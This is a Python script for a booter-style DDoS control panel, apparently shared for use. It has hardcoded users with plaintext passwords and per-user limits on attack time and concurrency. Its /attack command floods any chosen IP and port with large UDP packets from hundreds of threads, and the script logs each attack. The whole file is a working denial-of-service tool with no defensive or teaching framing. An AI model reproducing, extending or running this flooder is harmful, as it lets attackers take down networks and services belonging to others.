import os
import threading
import time
import socket
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

# Users and their limits
users = {
    "Zjoch": {"pass": "Test", "concu": 1, "time": 60},
    "zSky": {"pass": "Zsky", "concu": 1, "time": 60},
    "lulumina": {"pass": "luluadmin", "concu": 2, "time": 300}
}

user_attacks = {}

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_red(text):
    print(Fore.RED + text + Style.RESET_ALL)

def attack_banner():
    banner = """
   ▗▄▖▗▄▄▄▖▗▄▄▄▖▗▄▖  ▗▄▄▖▗▖ ▗▖     ▗▄▄▖▗▄▄▄▖▗▖  ▗▖▗▄▄▄▖
  ▐▌ ▐▌ █    █ ▐▌ ▐▌▐▌   ▐▌▗▞▘    ▐▌   ▐▌   ▐▛▚▖▐▌  █  
  ▐▛▀▜▌ █    █ ▐▛▀▜▌▐▌   ▐▛▚▖      ▝▀▚▖▐▛▀▀▘▐▌ ▝▜▌  █  
  ▐▌ ▐▌ █    █ ▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌    ▗▄▄▞▘▐▙▄▄▖▐▌  ▐▌  █
"""
    print(Fore.RED + banner + Style.RESET_ALL)

def send_attack(ip, port, method, conc, attack_time, username):
    if ip == "127.0.0.1":
        print_red("[!] Cannot attack 127.0.0.1")
        return

    user_attacks[username] = True
    clear_screen()
    attack_banner()

    print_red(f"IP: {ip}")
    print_red(f"PORT: {port}")
    print_red(f"TIME: {attack_time}s")
    print_red(f"METHOD: {method}")
    print_red(f"CONCURRENTS: {conc}")
    print_red("PLAN: VIP\n")

    def flood():
        end = time.time() + attack_time
        data = bytes(65500)
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(data, (ip, port))
            except Exception as e:
                print_red(f"[!] Error during attack: {e}")

    threads = []
    for _ in range(conc * 100):  # 100 threads per concurrent
        t = threading.Thread(target=flood)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    log_attack(ip, port, method, conc, attack_time)
    print_red("\n[+] Attack finished.\n")
    user_attacks[username] = False
    time.sleep(2)
    main()

def log_attack(ip, port, method, conc, time_):
    with open("attack_log.txt", "a") as f:
        f.write(f"[{datetime.now()}] IP: {ip} | PORT: {port} | METHOD: {method} | CONCURRENTS: {conc} | TIME: {time_}s\n")

def command_shell(username):
    print_red("末端攻撃を実行した。")
    print_red("C2: lulumina, zjoch\n")

    prompt = f"{Fore.RED + username + Style.RESET_ALL}•C2>> "

    while True:
        if user_attacks.get(username):
            print_red("[!] Waiting for current attack to finish...")
            time.sleep(1)
            continue

        cmd = input(prompt).strip()

        if cmd == "/help":
            print_red("/attack [ip] [port] [method] [concurrents] [time]")
            print_red("/methods")
            print_red("/log (only lulumina)")

        elif cmd == "/methods":
            print_red("Available methods: UDPPPS, UDPGOOD")

        elif cmd.startswith("/attack"):
            parts = cmd.split()
            if len(parts) != 6:
                print_red("[!] Usage: /attack [ip] [port] [method] [concurrents] [time]")
                continue

            ip, port, method, conc, attack_time = parts[1:]

            if not port.isdigit() or not conc.isdigit() or not attack_time.isdigit():
                print_red("[!] Port, concurrents, and time must be integers.")
                continue

            port = int(port)
            conc = int(conc)
            attack_time = int(attack_time)

            max_conc = users[username]["concu"]
            max_time = users[username]["time"]

            if conc > max_conc:
                print_red(f"[!] Max concurrents: {max_conc}")
                continue
            if attack_time > max_time:
                print_red(f"[!] Max time: {max_time}s")
                continue

            threading.Thread(target=send_attack, args=(ip, port, method, conc, attack_time, username)).start()
            break

        elif cmd == "/log":
            if username != "lulumina":
                print_red("[!] Only lulumina can view logs.")
                continue
            if not os.path.exists("attack_log.txt"):
                print_red("[!] No logs found.")
                continue
            with open("attack_log.txt", "r") as f:
                print_red("\n[Attack Logs]:")
                print(f.read())

        else:
            print_red("[!] Unknown command.")

def main():
    clear_screen()
    print("username:")
    username = input().strip()
    print("password:")
    password = input().strip()

    if username in users and users[username]["pass"] == password:
        clear_screen()
        command_shell(username)
    else:
        print_red("[!] Invalid credentials.")
        time.sleep(2)
        main()

if __name__ == "__main__":
    main()
